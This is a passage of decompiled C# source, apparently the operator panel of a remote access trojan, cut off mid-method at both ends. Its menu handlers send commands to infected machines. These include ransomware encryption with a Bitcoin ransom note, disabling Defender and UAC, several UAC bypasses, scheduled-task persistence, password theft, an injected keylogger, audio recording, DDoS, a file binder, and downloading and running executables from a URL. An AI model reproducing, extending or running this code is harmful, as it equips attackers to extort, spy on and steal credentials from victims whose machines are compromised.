					msgPack.ForcePathObject("Title").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00007A04 File Offset: 0x00005C04
		private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				Settings.ReportWindow = false;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
				msgPack.ForcePathObject("Option").AsString = "stop";
				object lockReportWindowClients = Settings.LockReportWindowClients;
				lock (lockReportWindowClients)
				{
					foreach (Clients @object in Settings.ReportWindowClients)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00007AE0 File Offset: 0x00005CE0
		private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "close";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00007BA4 File Offset: 0x00005DA4
		private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00007C68 File Offset: 0x00005E68
		private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using (OpenFileDialog openFileDialog = new OpenFileDialog())
				{
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
						msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
						msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
						msgPack.ForcePathObject("Update").AsString = "true";
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						foreach (Clients clients in this.GetSelectedClients())
						{
							clients.LV.ForeColor = Color.Red;
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000082 RID: 130 RVA: 0x00007DD0 File Offset: 0x00005FD0
		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "uninstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00007E94 File Offset: 0x00006094
		private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				Clients[] selectedClients = this.GetSelectedClients();
				if (selectedClients.Length == 0)
				{
					Process.Start(Application.StartupPath);
				}
				else
				{
					foreach (Clients clients in selectedClients)
					{
						string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
						if (Directory.Exists(text))
						{
							Process.Start(text);
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00007F1C File Offset: 0x0000611C
		private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00007FF4 File Offset: 0x000061F4
		private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "shutdown";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000086 RID: 134 RVA: 0x000080CC File Offset: 0x000062CC
		private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "logoff";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x000081A4 File Offset: 0x000063A4
		private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormBlockClients formBlockClients = new FormBlockClients())
			{
				formBlockClients.ShowDialog();
			}
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00002219 File Offset: 0x00000419
		private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.notifyIcon1.Dispose();
			Environment.Exit(0);
		}

		// Token: 0x06000089 RID: 137 RVA: 0x000081DC File Offset: 0x000063DC
		private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormFileSearcher formFileSearcher = new FormFileSearcher())
			{
				if (formFileSearcher.ShowDialog() == DialogResult.OK && this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
					msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000L * 1000L;
					msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x0000832C File Offset: 0x0000652C
		private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "information";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Information.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00008404 File Offset: 0x00006604
		private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "dosAdd";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
					this.formDOS.Show();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600008C RID: 140 RVA: 0x000084E8 File Offset: 0x000066E8
		private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Message", "Message", "All your files have been encrypted. pay us 0.2 BITCOIN. Our address is 1234567890", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					if (this.listView1.SelectedItems.Count > 0)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "encrypt";
						msgPack.ForcePathObject("Message").AsString = text;
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ransomware.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						Clients[] selectedClients = this.GetSelectedClients();
						for (int i = 0; i < selectedClients.Length; i++)
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600008D RID: 141 RVA: 0x000085FC File Offset: 0x000067FC
		private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Password", "Password", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					if (this.listView1.SelectedItems.Count > 0)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "decrypt";
						msgPack.ForcePathObject("Password").AsString = text;
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ransomware.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						Clients[] selectedClients = this.GetSelectedClients();
						for (int i = 0; i < selectedClients.Length; i++)
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00008710 File Offset: 0x00006910
		private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00008834 File Offset: 0x00006A34
		private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormAudio)Application.OpenForms["Audio Recorder:" + clients.ID] == null)
					{
						new FormAudio
						{
							Name = "Audio Recorder:" + clients.ID,
							Text = "Audio Recorder:" + clients.ID,
							F = this,
							ParentClient = clients,
							Client = clients
						}.Show();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000090 RID: 144 RVA: 0x000088E8 File Offset: 0x00006AE8
		private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uac";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000091 RID: 145 RVA: 0x000089F0 File Offset: 0x00006BF0
		private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00008AF8 File Offset: 0x00006CF8
		private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00008BD0 File Offset: 0x00006DD0
		private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
				Clients[] selectedClients = this.GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Recovering...", Color.Black);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000094 RID: 148 RVA: 0x00008C74 File Offset: 0x00006E74
		private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass3";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00008D7C File Offset: 0x00006F7C
		private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0 && MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text == "Admin")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00008EA0 File Offset: 0x000070A0
		private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass2";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						if (clients.LV.SubItems[this.lv_admin.Index].Text != "Administrator")
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x0000222C File Offset: 0x0000042C
		private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Process.Start("https://t.me/toxicnetarmy");
		}

		// Token: 0x06000098 RID: 152 RVA: 0x00008FA8 File Offset: 0x000071A8
		private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormSetting formSetting = new FormSetting())
			{
				formSetting.ShowDialog();
			}
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00008FE0 File Offset: 0x000071E0
		private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
				msgPack.ForcePathObject("Inject").AsString = "";
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Auto Keylogger:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x000091B0 File Offset: 0x000073B0
		private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00009288 File Offset: 0x00007488
		private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fakeBinder";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00009480 File Offset: 0x00007680
		private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Netstat.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormNetstat)Application.OpenForms["Netstat:" + clients.ID] == null)
					{
						new FormNetstat
						{
							Name = "Netstat:" + clients.ID,
							Text = "Netstat:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00009580 File Offset: 0x00007780
		private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
					msgPack.ForcePathObject("url").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00009690 File Offset: 0x00007890
		private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
					msgPack.ForcePathObject("url").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendFileFromUrl: " + Path.GetFileName(text);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
